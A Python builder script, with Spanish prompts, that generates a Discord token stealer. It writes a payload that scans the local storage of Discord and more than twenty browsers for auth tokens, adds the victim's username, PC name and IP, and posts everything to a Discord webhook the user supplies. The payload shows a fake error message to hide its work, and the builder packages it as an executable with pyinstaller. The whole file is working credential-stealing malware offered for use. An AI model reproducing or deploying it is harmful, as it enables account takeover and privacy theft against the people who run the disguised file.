from colorama import Fore
import time
import os


def create_grabber():
    webhookUrl = input(Fore.BLUE + f"\n [>] Webhook: ")
    if "https://discord.com/api/webhooks" in webhookUrl:
        
        fileName = input(f" [>] Nombre del archivo: " + Fore.RESET)

        print(Fore.GREEN + f"\n [+] Escribiendo codigo..." + Fore.RESET)
        time.sleep(.3)

        try:
            with open(f"./output/{fileName}.py", "w") as file:
                file.write("""
import os
import re
import json

from urllib.request import Request, urlopen

def get_tokens(path):
    tokens = []

    for file in [i for i in os.listdir(path) if i.endswith('.ldb') or i.endswith('.log')]:
        with open(f"{path}\\\\{file}", "r", errors='ignore') as file:
            for line in file.readlines():
                for tkn in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', line.strip()):
                    if tkn not in tokens:
                        tokens.append(tkn)
                for tkn in re.findall(r'mfa\\.[\\w-]{84}', line.strip()):
                    if tkn not in tokens:
                        tokens.append(tkn)

    return tokens

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
    'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
    'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
    'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
    'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
    'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
    'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
    'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
    'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
    'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
    'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
    '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
    'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
    'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
    'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
    'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
    'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
    'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
    'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
}

grabbedTokens = {}

for key, val in paths.items():
    if os.path.exists(f"{val}\\\\Local Storage\\\\leveldb"):
        grab = get_tokens(f"{val}\\\\Local Storage\\\\leveldb")
        if len(grab) != 0:
            grabbedTokens[key] = grab

message = "```ini\\n"

try:
    req = Request("http://httpbin.org/ip")
    ip = json.loads(urlopen(req, timeout = 3).read().decode())["origin"]
except Exception as e:
    ip = "Unable to fetch"

pc_name = os.getenv('COMPUTERNAME') if os.getenv('COMPUTERNAME') is not None else os.uname().nodename
user = os.getenv('username')

message += f"[ User Data ]\\n - Username: {user}\\n - Nombre del pc: {pc_name}\\n - IP: {ip}\\n\\n"

if len(grabbedTokens) == 0:
    message += "[ No se han encontrado tokens ]"
else:
    for key, val in grabbedTokens.items():
        message += f"[ {key} ]\\n - "
        message += "\\n - ".join(val)
        message += "\\n\\n"
    message += "```"

headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
payload = json.dumps({'content': message})

req = Request(
    "~~TOKENURLHERE~~",
    data=payload.encode(),
    headers=headers
)

urlopen(req)

print("Tu pc no es compatible con este tipo de programas.")
input("Presione enter para salir.")
    """.replace("~~TOKENURLHERE~~", webhookUrl))

        except Exception as e:
            print(Fore.RED + f" [-] Error al escribir el archivo: {e}"+ Fore.RESET)
        else:
            
            print(Fore.GREEN + f" [+] Archivo escrito como: {fileName}.py | Este archivo lo puedes encontrar en la carpeta *output*" + Fore.RESET)
        
        
    else:
        print(Fore.RESET + Fore.YELLOW + ' [-] Webhook invalida'+ Fore.RESET)
    try:
        os.system('pip install pyinstaller')
        filedir = f"./output/{fileName}.py"
        os.system(f'pyinstaller --specpath ./Build/ --distpath ./output/exefiles/ --onefile {filedir}')
        os.system('cls')
        print(Fore.GREEN + '[+] Archivo convertido a .exe, lo puedes encontrar en ./output/exefiles' + Fore.RESET)
    except:
        print(Fore.RED + '[-] Error al convertir el archivo en exe' + Fore.RESET)
